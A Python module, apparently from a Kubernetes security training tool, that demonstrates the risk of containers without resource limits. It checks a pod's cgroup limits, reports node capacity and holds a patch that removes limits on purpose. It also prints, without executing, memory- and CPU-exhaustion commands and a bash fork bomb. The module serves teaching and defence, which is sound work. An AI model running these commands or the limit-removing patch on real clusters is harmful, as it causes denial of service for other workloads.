"""Missing resource limits exploit implementation."""

import os
from typing import Dict, List

from .base import BaseExploit, ExploitResult


class MissingResourceLimitsExploit(BaseExploit):
    """Exploit for missing resource limits misconfiguration."""

    name = "Missing Resource Limits"
    risk_level = "MEDIUM-HIGH"
    vulnerability_type = "missing-resource-limits"
    description = """This exploit demonstrates how missing resource limits can:

- Enable denial-of-service attacks
- Cause node instability
- Impact other workloads
- Lead to cascading failures
- Result in excessive cloud costs

Without proper limits, a single container can consume
all available CPU and memory on a node, affecting all
other workloads and potentially crashing the node."""

    def get_default_service(self) -> str:
        return "unguard-membership-service"

    def get_vulnerable_patch(self) -> List[Dict]:
        return [{"op": "remove", "path": "/spec/template/spec/containers/0/resources"}]

    def get_secure_patch(self) -> List[Dict]:
        return [
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext",
                "value": {},
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/runAsNonRoot",
                "value": True,
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/runAsUser",
                "value": 1000,
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/allowPrivilegeEscalation",
                "value": False,
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/securityContext/capabilities",
                "value": {"drop": ["ALL"]},
            },
            {
                "op": "add",
                "path": "/spec/template/spec/containers/0/resources",
                "value": {
                    "limits": {"memory": "256Mi", "cpu": "200m"},
                    "requests": {"memory": "128Mi", "cpu": "100m"},
                },
            },
        ]

    def check_vulnerability(self) -> bool:
        """Check if service has resource limits."""
        pod_name = self.k8s.find_pod_for_service(self.service)
        if not pod_name:
            return False

        try:
            pod = self.k8s.v1.read_namespaced_pod(pod_name, self.k8s.namespace)
            container = pod.spec.containers[0]  # type: ignore[attr-defined]

            # Check for missing resource limits
            if not container.resources or not container.resources.limits:
                return True

            return False
        except Exception:
            return False

    def demonstrate(self) -> ExploitResult:
        """Demonstrate resource exhaustion risks."""
        self.logger.exploit("Demonstrating resource exhaustion risks...")

        pod_name = self.k8s.find_pod_for_service(self.service)
        if not pod_name:
            return ExploitResult(
                success=False,
                message="Pod not found for service",
            )

        # Fallback for cgroup hierarchy variations
        cgroup_memory_path = "/sys/fs/cgroup/memory/memory.limit_in_bytes"
        cgroup_cpu_path = "/sys/fs/cgroup/cpu/cpu.cfs_quota_us"
        if not os.path.exists(cgroup_memory_path) and not os.path.exists(
            cgroup_cpu_path
        ):
            return ExploitResult(
                success=False,
                message="Cgroup paths not found, cannot demonstrate vulnerability",
            )

        evidence = []
        impact = []

        # Test 1: Check current resource limits
        self.logger.exploit("Test 1: Checking current resource limits")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Checking memory limits..."
                
                # Check cgroup v1
                if [ -f /sys/fs/cgroup/memory/memory.limit_in_bytes ]; then
                    limit=$(cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null)
                    limit_gb=$((limit / 1073741824))
                    
                    if [ "$limit" = "9223372036854771712" ] || [ "$limit_gb" -gt 100 ]; then
                        echo "❌ VULNERABLE: No effective memory limit!"
                        echo "[*] Container can use all available node memory"
                    else
                        limit_mb=$((limit / 1048576))
                        echo "✅ Protected: Memory limited to ${limit_mb}MB"
                    fi
                # Check cgroup v2
                elif [ -f /sys/fs/cgroup/memory.max ]; then
                    limit=$(cat /sys/fs/cgroup/memory.max 2>/dev/null)
                    if [ "$limit" = "max" ]; then
                        echo "❌ VULNERABLE: No memory limit set (cgroup v2)"
                    else
                        limit_mb=$((limit / 1048576))
                        echo "✅ Protected: Memory limited to ${limit_mb}MB"
                    fi
                else
                    echo "⚠️  Cannot determine memory limits"
                fi
                
                echo ""
                echo "[*] Checking CPU limits..."
                
                # Check cgroup v1
                if [ -f /sys/fs/cgroup/cpu/cpu.cfs_quota_us ]; then
                    quota=$(cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us 2>/dev/null)
                    if [ "$quota" = "-1" ]; then
                        echo "❌ VULNERABLE: No CPU limit set"
                        echo "[*] Container can use all available CPU cores"
                    else
                        period=$(cat /sys/fs/cgroup/cpu/cpu.cfs_period_us 2>/dev/null)
                        cpu_limit=$(awk "BEGIN {printf \\"%.2f\\", $quota/$period}")
                        echo "✅ Protected: CPU limited to $cpu_limit cores"
                    fi
                # Check cgroup v2
                elif [ -f /sys/fs/cgroup/cpu.max ]; then
                    cpu_max=$(cat /sys/fs/cgroup/cpu.max 2>/dev/null)
                    if [ "$cpu_max" = "max 100000" ]; then
                        echo "❌ VULNERABLE: No CPU limit set (cgroup v2)"
                    else
                        echo "✅ Protected: CPU limit configured"
                    fi
                else
                    echo "⚠️  Cannot determine CPU limits"
                fi
            """,
            )

            print(result)

            if "No effective memory limit" in result or "No memory limit set" in result:
                evidence.append("No memory limits configured")
                impact.append("Can consume all available memory on the node")

            if "No CPU limit set" in result:
                evidence.append("No CPU limits configured")
                impact.append("Can consume all available CPU resources")

        except Exception as e:
            self.logger.error(f"Test 1 failed: {e}")

        # Test 2: Current resource usage
        self.logger.exploit("Test 2: Current resource usage")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Current resource consumption..."
                
                # Memory usage
                if [ -f /proc/meminfo ]; then
                    total_mem=$(grep MemTotal /proc/meminfo | awk '{print $2}')
                    free_mem=$(grep MemAvailable /proc/meminfo | awk '{print $2}')
                    used_mem=$((total_mem - free_mem))
                    used_mb=$((used_mem / 1024))
                    
                    echo "[*] Memory: Using ${used_mb}MB"
                fi
                
                # CPU info
                cpu_count=$(nproc 2>/dev/null || echo "unknown")
                echo "[*] CPU cores visible: $cpu_count"
                
                # Current process count
                proc_count=$(ps aux | wc -l)
                echo "[*] Running processes: $proc_count"
            """,
            )

            print(result)

        except Exception as e:
            self.logger.error(f"Test 2 failed: {e}")

        # Test 3: Resource consumption potential
        self.logger.exploit("Test 3: Resource consumption potential")
        try:
            result = self.k8s.exec_in_pod(
                pod_name,
                """
                echo "[*] Demonstrating resource consumption potential..."
                echo ""
                echo "⚠️  WARNING: Not running actual resource bombs for safety"
                echo ""
                echo "[EXPLOIT] Memory consumption attack:"
                echo "  stress --vm 10 --vm-bytes 1G --timeout 60s"
                echo "  # or"
                echo "  while true; do"
                echo "    dd if=/dev/zero of=/tmp/bigfile bs=100M count=10"
                echo "    cat /tmp/bigfile /tmp/bigfile > /tmp/bigfile2"
                echo "    mv /tmp/bigfile2 /tmp/bigfile"
                echo "  done"
                echo ""
                echo "[EXPLOIT] CPU consumption attack:"
                echo "  stress --cpu 100 --timeout 60s"
                echo "  # or"
                echo "  while true; do"
                echo '    echo "scale=10000; 4*a(1)" | bc -l >/dev/null &'
                echo "  done"
                echo ""
                echo "[EXPLOIT] Fork bomb (process exhaustion):"
                echo "  :(){ :|:& };:"
                echo ""
                echo "[*] These attacks would consume all available resources"
            """,
            )

            print(result)

            evidence.append("Container can launch resource exhaustion attacks")
            impact.append("Can cause denial of service on the node")

        except Exception as e:
            self.logger.error(f"Test 3 failed: {e}")

        # Test 4: Impact assessment
        self.logger.exploit("Test 4: Impact assessment")

        try:
            # Get node information from outside the container
            pod = self.k8s.v1.read_namespaced_pod(pod_name, self.k8s.namespace)
            node_name = pod.spec.node_name  # type: ignore[attr-defined]

            print(f"[*] Container running on node: {node_name}")

            # Get node capacity
            node = self.k8s.v1.read_node(node_name)
            cpu_capacity = node.status.capacity.get("cpu", "unknown")  # type: ignore[attr-defined]
            memory_capacity = node.status.capacity.get("memory", "unknown")  # type: ignore[attr-defined]

            print("[*] Node capacity:")
            print(f"    CPU: {cpu_capacity} cores")
            print(f"    Memory: {memory_capacity}")

            evidence.append(f"Running on node {node_name} with {cpu_capacity} CPUs")

        except Exception as e:
            self.logger.error(f"Test 4 failed: {e}")

        # Summary
        self.logger.exploit("=== Impact Summary ===")
        summary_impact = [
            "Consume all CPU, causing slowdowns",
            "Exhaust memory, triggering OOM kills",
            "Create thousands of processes",
            "Impact all other pods on the node",
            "Cause node instability or crashes",
            "Trigger cascading failures in the cluster",
        ]

        for item in summary_impact:
            print(f"  • {item}")

        return ExploitResult(
            success=bool(evidence),
            message="Missing resource limits exploit demonstrated",
            evidence=evidence,
            impact=impact + summary_impact,
        )
